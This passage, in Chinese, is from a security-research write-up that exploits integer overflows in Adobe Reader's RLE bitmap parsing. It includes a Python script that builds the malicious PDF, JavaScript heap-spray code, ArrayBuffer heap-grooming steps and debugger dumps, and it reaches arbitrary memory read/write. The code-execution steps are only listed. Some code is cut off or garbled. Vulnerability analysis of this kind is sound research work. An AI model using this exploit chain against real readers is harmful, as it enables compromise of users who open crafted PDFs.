          pdf
            1.7
            5
            *
    endstream
    endobj
    xref
    0 7
    0000000000 65535 f 
    0000000009 00000 n 
    0000000237 00000 n 
    0000000306 00000 n 
    0000000587 00000 n 
    0000000746 00000 n 
    0000000782 00000 n 
    trailer
    >
    startxref
    __XREF_OFFSET__
    %%EOF
为了触发整数溢出，前面构造的位图文件的大小将超过 `60MB` ，而且在嵌入 XFA 表单时，需要对其进行 Base64 编码，这会使得生成的 PDF
文件相当大。为了压缩 PDF 文件的大小，可以给对象 `6 0 obj` 指定一个 `Filter` （这里为 `FlateDecode`
）以便压缩对象的数据，因为数据比较规律，所以压缩率还是相当可观的。
为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript
代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 `subform` 的 `initialize` 事件和
`docReady` 事件设置事件处理代码来完成。
下面的 Python 代码可以用于生成 PDF 文件：
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    import os
    import sys
    import zlib
    import base64
    def parse_template(template_path):
        with open(template_path, 'rb') as f:
            data = f.read()
        xdp_begin = data.find('') + len('')
        part1 = data[:xdp_begin]
        part2 = data[xdp_begin:xdp_end]
        part3 = data[xdp_end:]
        return part1, part2, part3
    def generate_pdf(image_path, template_path, pdf_path):
        pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)
        with open(image_path, 'rb') as f:
            image_data = base64.b64encode(f.read())
        pdf_part2 = pdf_part2.replace('__IMAGE_BASE64_DATA__', image_data)
        pdf_part2 = zlib.compress(pdf_part2)
        pdf_part1 = pdf_part1.replace('__STREAM_LENGTH__', '%d' % len(pdf_part2))
        pdf_data = pdf_part1 + pdf_part2 + pdf_part3
        pdf_data = pdf_data.replace('__XREF_OFFSET__', '%d' % pdf_data.find('xref'))
        with open(pdf_path, 'wb') as f:
            f.write(pdf_data)
    if __name__ == '__main__':
        if len(sys.argv) != 4:
            filename = os.path.basename(sys.argv[0])
            print 'Usage: %s   ' % filename
            sys.exit(1)
        generate_pdf(sys.argv[1], sys.argv[2], sys.argv[3])
### 5.5 利用技巧
#### 5.5.1 内存布局 (1)
这里借助 `ArrayBuffer` 来完成内存布局。
因为位图解析过程中创建的堆块大小为 `0xF0` 字节，因此 `ArrayBuffer` 的 `byteLength` 可以设置为 `0xE0`
。为了创建内存空洞，可以先创建大量的 `ArrayBuffer` 对象，然后间隔释放其中的一半对象，理想情况下的内存布局如下：
    ┌─────────────┬─────────────┬─────────────┬─────────────┐
    │ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │
    └─────────────┴─────────────┴─────────────┴─────────────┘
    │  │
在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：
    ┌─────────────┬─────────────┬─────────────┬─────────────┐
    │ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │
    └─────────────┴─────────────┴─────────────┴─────────────┘
因为可以向低地址方向越界写 `0xF4` 字节的 `0x10` 数据，所以触发漏洞之后，`ArrayBuffer` 对象的 **backing
store** 的内存布局如下：
    0:014> dd 304c8398
    ;            -, byteLength, viewobj,       -,
    304c8398  00000000 10101010 10101010 10101010
    ;         ArrayBuffer 数据
    304c83a8  10101010 10101010 10101010 10101010
    304c83b8  10101010 10101010 10101010 10101010
    304c83c8  10101010 10101010 10101010 10101010
    304c83d8  10101010 10101010 10101010 10101010
    304c83e8  10101010 10101010 10101010 10101010
    304c83f8  10101010 10101010 10101010 10101010
    304c8408  10101010 10101010 10101010 10101010
    304c8418  10101010 10101010 10101010 10101010
    304c8428  10101010 10101010 10101010 10101010
    304c8438  10101010 10101010 10101010 10101010
    304c8448  10101010 10101010 10101010 10101010
    304c8458  10101010 10101010 10101010 10101010
    304c8468  10101010 10101010 10101010 10101010
    304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束
    ; 下一个堆块的元数据（存储位图数据的堆块）
    304c8488  10101010 10101010
    ; 位图数据
    304c8490                    00000000 00000000
此时 `ArrayBuffer` 对象的 `byteLength` 被改成了 `0x10101010` ，但是 `DataView` 对象的指针也被改成了
`0x10101010` ，前面提到过这会导致进程崩溃。
#### 5.5.2 内存布局 (0)
为了避免进程崩溃，需要提前在地址 `0x10101010` 上布局数据，让这个地址看起来就是一个 `DataView`
指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。
同样，这里借助 `ArrayBuffer` 实现精确的内存布局：
  * 创建大量 `byteLength` 为 `0xFFE8` 的 `ArrayBuffer`
  * 在特定内存范围内，`ArrayBuffer` 的 **backing store** 将有序的出现在地址 `0xYYYY0048` 上
之所以选择 `0xFFE8` ，是因为这会使得 **backing store** 所在堆块整体的大小为 `0x10000` ：
    // 0xFFE8 -> byteLength
    // 0x10 -> sizeof ObjectElements
    // 0x08 -> sizeof heap block's metadata
    0xFFE8 + 0x10 + 0x08 = 0x10000
使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：
    function fillHeap() {
        var array = new Array(0x1200);
        array[0] = new ArrayBuffer(0xFFE8);
        var dv = new DataView(array[0]);
        dv.setUint32(0xFB8, 0x10100058, true);
        dv.setUint32(0, 0x10100158, true);
        dv.setUint32(0xFFA8, 0x10100258, true);
        dv.setUint32(0x200 + 0x14, 0x10100358, true);
        for (var i = 1; i 
    ┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐
    │ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │
    └──────┼──────┴─────────────┴┼────────────┴─────────────┘
           └──>───>───>───>────>─┘
            (2) byteLength to -1
当下一个 `ArrayBuffer` 对象的 `byteLength` 被改成 `0xFFFFFFFF` 时，基于这个 `ArrayBuffer`
对象就可以实现用户态空间的全局读写了。
#### 5.5.4 任意地址读写
一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 `ArrayBuffer`
对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。
这里可以通过搜索 `ffeeffee` 或者 `f0e0d0c0` 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。
    0:014> dd 30080000
    30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee
    30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -> 30080000
    30080020  00000fcf 30080040 3104f000 000002e5
    30080030  00000001 00000000 30d69ff0 30d69ff0
    30080040  3eb82e96 08013313 00000000 0000ffe8
    30080050  00000000 00000000 10100158 00000000
    30080060  00000000 00000000 00000000 00000000
    30080070  00000000 00000000 00000000 00000000
    0:014> dd 305f4000
    305f4000  00000000 00000000 6ab08d69 0858b71a
    305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0
    305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -> 305f402c
    305f4030  e5c521a7 d9b264d4 919cee58 45da954e
    305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340
    305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4
    305f4060  919cee58 45da954e 9c3f608b f952aa94
    305f4070  989c772a a1dd934a ac5b154b 2fadd038
#### 5.5.5 剩余步骤
在拥有任意地址读写能力之后，实现代码执行就是固定的套路了，本文对此不做详细介绍。
剩余的步骤如下：
  * EIP 劫持
  * ASLR 绕过
  * DEP 绕过
  * CFG 绕过
## 0x06. CVE-2013-2729
前面提到一共找到了三处整数溢出，其中一处位于 RLE8 数据解析过程中，另外两处位于 RLE4
数据解析过程中。难道不应该有四个位置存在整数溢出吗？为什么只找到了三个？
因为有一个在六年前已经修复了（参考 [feliam’s write up for
CVE-2013-2729](http://blog.binamuse.com/2013/05/readerbmprle.html)）！从版本
`2019.012.20035` 中的代码也可以看到，确实有一个地方判断了整数溢出的情况，这就是 CVE-2013-2729 引入的补丁。
    dst_xpos = BYTE1(cmd) + xpos;
    if ( ypos >= height || dst_xpos  width )  // overflow check
      goto LABEL_170;         // CxxThrowException
然而 Adobe 仅仅修补了报告的这一个位置，而忽略了其他三个位置上的整数溢出。
## 0x07. 经验教训
对厂商而言，在深入理解漏洞本质的同时，还可以看看是不是有类似的问题需要修复。
对安全研究人员而言，分析完漏洞之后还可以顺便看一下厂商的修复方式，也许不经意间就能发现新的漏洞。
* * *